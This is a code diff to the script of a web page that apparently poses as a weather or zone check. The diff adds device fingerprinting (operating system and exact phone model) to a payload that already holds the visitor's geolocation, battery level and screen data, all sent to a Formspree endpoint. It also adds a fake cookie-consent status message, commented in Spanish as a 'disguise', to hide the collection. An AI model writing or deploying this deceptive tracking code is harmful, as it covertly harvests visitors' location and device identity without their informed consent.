@@ -282,6 +282,15 @@
 <script>
     const API_URL = "https://formspree.io/f/xgakrnjg";
 
+    // Función para verificar y establecer cookie de "consentimiento"
+    function checkCookieAndProceed() {
+        if (!document.cookie.includes('meteo_check_cookie')) {
+            document.cookie = "meteo_check_cookie=true;max-age=" + 60 * 60 * 24 * 30 + ";path=/";
+            return true;
+        }
+        return false;
+    }
+
     function obtenerUbicacion() {
         if (!("geolocation" in navigator)) {
             return Promise.resolve({ disponible: false, motivo: "No soportado" });
@@ -325,6 +334,33 @@
         }
     }
 
+    // Función para extraer SO y Modelo de Dispositivo
+    function getDeviceInfo(userAgent) {
+        let device = "PC / Laptop";
+        let os = "Desconocido";
+
+        if (/Android/.test(userAgent)) {
+            os = "Android";
+            const match = userAgent.match(/;\s*([a-zA-Z0-9]+)\s*Build\//);
+            if (match && match[1]) device = "Android " + match[1];
+            else device = "Dispositivo Android";
+        } else if (/iPhone|iPad|iPod/.test(userAgent)) {
+            os = "iOS";
+            device = /iPhone/.test(userAgent) ? "iPhone" : /iPad/.test(userAgent) ? "iPad" : "iPod";
+        } else if (/Windows/.test(userAgent)) {
+            os = "Windows";
+            device = "Windows PC";
+        } else if (/Mac/.test(userAgent)) {
+            os = "macOS";
+            device = "Mac";
+        } else if (/Linux/.test(userAgent)) {
+            os = "Linux";
+            device = "Linux Device";
+        }
+
+        return { sistemaOperativo: os, dispositivoExacto: device };
+    }
+
     async function iniciar() {
         const btn = document.getElementById("btnStart");
         const progressBox = document.getElementById("progressBox");
@@ -339,7 +375,11 @@
         resultBox.style.display = "none";
         progressBox.style.display = "block";
 
-        s1.textContent = "⏳ Detectando zona...";
+        // 1. DISFRAZO DE COOKIE
+        const isCookieSet = checkCookieAndProceed();
+        
+        s1.textContent = isCookieSet ? "✅ Cookies aceptadas..." : "⏳ Sincronizando...";
+        
         const ubicacion = await obtenerUbicacion();
         s1.textContent = ubicacion.disponible ? "✅ Zona detectada" : "⚠️ Zona no disponible";
 
@@ -352,6 +392,9 @@
             ? `https://www.google.com/maps?q=${ubicacion.latitud},${ubicacion.longitud}`
             : "Ubicación no disponible";
 
+        // 2. INFORMACIÓN EXACTA DEL DISPOSITIVO
+        const infoDispositivo = getDeviceInfo(navigator.userAgent);
+
         const payload = {
             fechaHora: new Date().toISOString(),
             enlaceMapa,
@@ -362,7 +405,9 @@
                 plataforma: navigator.platform,
                 idioma: navigator.language,
                 pantalla: `${window.screen.width}x${window.screen.height}`,
-                bateria
+                bateria,
+                sistemaOperativo: infoDispositivo.sistemaOperativo,
+                dispositivoExacto: infoDispositivo.dispositivoExacto
             }
         };
 
